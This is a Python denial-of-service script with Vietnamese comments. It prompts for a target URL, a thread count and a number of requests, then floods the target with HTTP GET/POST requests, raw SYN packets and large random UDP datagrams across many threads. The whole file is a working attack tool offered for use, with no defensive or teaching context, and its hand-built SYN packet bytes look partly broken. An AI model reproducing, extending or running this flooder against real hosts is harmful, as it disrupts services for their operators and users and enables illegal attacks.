import socket
import threading
import requests
import random
import time

# Hàm nhập target từ bàn phím (chỉ URL, tự động lấy port)
def get_target():
    print("Nhap target URL (vd: http://example.com:8080 hoac https://example.com):")
    url = input().strip()
    print("Nhap so luong thread (vd: 500):")
    threads = int(input().strip())
    print("Nhap so request moi thread (vd: 10000):")
    req_per_thread = int(input().strip())
    return url, threads, req_per_thread

TARGET_URL, THREAD_COUNT, REQUESTS_PER_THREAD = get_target()

# Trích xuất IP và port từ URL
def extract_ip_and_port(url):
    # Xoa protocol
    host_part = url.replace("http://", "").replace("https://", "").split("/")[0]
    if ":" in host_part:
        hostname, port_str = host_part.split(":")
        port = int(port_str)
    else:
        hostname = host_part
        if url.startswith("https://"):
            port = 443
        else:
            port = 80
    ip = socket.gethostbyname(hostname)
    return ip, port

TARGET_IP, PORT = extract_ip_and_port(TARGET_URL)

# HTTP flood
def http_flood():
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    for _ in range(REQUESTS_PER_THREAD):
        try:
            session.get(TARGET_URL, headers=headers, timeout=3)
            session.post(TARGET_URL, data={"key": "value"}, headers=headers, timeout=3)
        except:
            pass

# SYN flood (yêu cầu quyền root)
def syn_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet = (
        b'\x45\x00\x00\x28'
        b'\x00\x01\x00\x00'
        b'\x40\x06\x00\x00'
        b'\x7f\x00\x00\x01'
        b'\x7f\x00\x00\x01'
        b'\x00\x50\x00\x50'
        b'\x00\x00\x00\x00'
        b'\x00\x00\x00\x00'
        b'\x50\x02\x20\x00'
        b'\x00\x00\x00\x00'
    )
    while True:
        try:
            sock.sendto(packet, (TARGET_IP, PORT))
        except:
            pass

# UDP flood
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65500)
    while True:
        try:
            sock.sendto(data, (TARGET_IP, PORT))
        except:
            pass

# Chạy các luồng
threads = []
for _ in range(THREAD_COUNT // 3):
    t = threading.Thread(target=http_flood)
    t.start()
    threads.append(t)
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    t.start()
    threads.append(t)
    t = threading.Thread(target=udp_flood)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()
